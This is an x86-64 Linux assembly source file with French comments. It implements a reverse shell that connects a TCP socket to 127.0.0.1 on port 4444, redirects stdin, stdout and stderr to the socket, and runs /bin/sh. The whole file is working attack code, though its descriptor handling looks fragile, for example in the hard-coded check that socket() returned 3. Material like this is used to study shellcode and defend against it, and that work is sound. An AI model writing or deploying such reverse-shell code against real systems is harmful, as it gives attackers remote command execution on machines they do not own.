; linux_reverse_shell.asm

global _start 						; On déclare le point d'entrée _start

section .bss 						; Déclaration de la structure sockaddr_in en section .bss (non initialisée)
	STRUC sockaddr_in
		sin_family:	RESW 1 			; Famille d'adresse (AF_INET pour IPv4)
		sin_port:	RESW 1 			; Port de destination (en network byte order)
		sin_addr:	RESD 1 			; Adresse IP de destination (en network byte order)
		sin_zero:	RESD 2 			; Champ de remplissage pour correspondre à la taille d'une structure sockaddr
	ENDSTRUC

section .data 						; Débute la section de données où les variables sont définies
	shell_str DB "/bin/sh", 0 		; Chaîne à passer à execve pour ouvrir un shell
	sa ISTRUC sockaddr_in			; Initialisation de la structure sockaddr_in
		AT sin_family, DW 0x02 		; AF_INET
		AT sin_port, DW 0x5C11		; Port 4444 en network byte order
		AT sin_addr, DD 0x100007F	; Adresse IP 127.0.0.1 en network byte order
		AT sin_zero, DD 0x0			; Champ de remplissage à 0
	IEND						
	sockaddr_in_size EQU $-sa		; Taille de la structure sockaddr_in

section .text 						; Débute la section du code exécutable

_start:
	; socket() - crée un socket endpoint pour la communication et retourne un descripteur de fichier.
	MOV	rax, 41						; syscall numéro pour socket()
	XOR	rbx, rbx
	MOV	bx, word [sa+sin_family]	; AF_INET
	MOV	rdi, rbx					; Premier argument : domaine (AF_INET)
	MOV	rsi, 0x1					; Deuxième argument : type (SOCK_STREAM pour TCP)
	XOR	rdx, rdx					; Troisième argument : protocol (0 pour choisir le protocole par défaut pour le type, TCP pour SOCK_STREAM)
	SYSCALL							; Appeler le syscall
	CMP	rax, 0x3	
	JNZ	_exit						; Si la création du socket a échoué, terminer le programme
	PUSH	rax						; Sinon, sauvegarder le descripteur de fichier du socket

	; connect() - connecte le socket à l'adresse spécifiée
	MOV	rax, 42						; syscall numéro pour connect()					
	POP	rdi							; Premier argument : descripteur de fichier du socket
	MOV	rsi, sa						; Deuxième argument : pointeur vers la structure sockaddr
	MOV	rdx, sockaddr_in_size		; Troisième argument : taille de la structure sockaddr
	SYSCALL	

	; dup2() - duplique un descripteur de fichier (utilisé pour rediriger stdin, stdout, stderr vers le socket)
	MOV	rax, 33						; syscall numéro pour dup2
	MOV	rsi, 0x0					; Deuxième argument : le nouveau descripteur de fichier (0 pour stdin)
	XOR	rdx, rdx					; Troisième argument : inutilisé, mis à 0
	SYSCALL

	; dup2() pour stdout
	MOV	rax, 33
	INC	rsi							; Dupliquer le descripteur de fichier du socket vers stdout
	XOR	rdx, rdx
	SYSCALL

	; dup2() pour stderr
	MOV 	rax, 33
	INC 	rsi						; Dupliquer le descripteur de fichier du socket vers stderr
	XOR	rdx, rdx
	SYSCALL

	; execve() - exécute le programme /bin/sh
	MOV	rax, 59						; syscall numéro pour execve
	MOV 	rdi, shell_str			; Premier argument : pointeur vers la chaîne de caractères du programme à exécuter
	XOR	rsi, rsi					; Deuxième argument : pointeur vers le tableau d'arguments du programme (0 pour aucun)
	XOR	rdx, rdx					; Troisième argument : pointeur vers le tableau d'environnement du programme (0 pour aucun)
	SYSCALL	

	JMP _exit
	
_exit:
	; exit() - termine le processus
	MOV	rax, 60						; syscall numéro pour exit	
	MOV	rdi, 0						; Premier argument : statut de sortie (0 pour succès)
	SYSCALL	

	

	
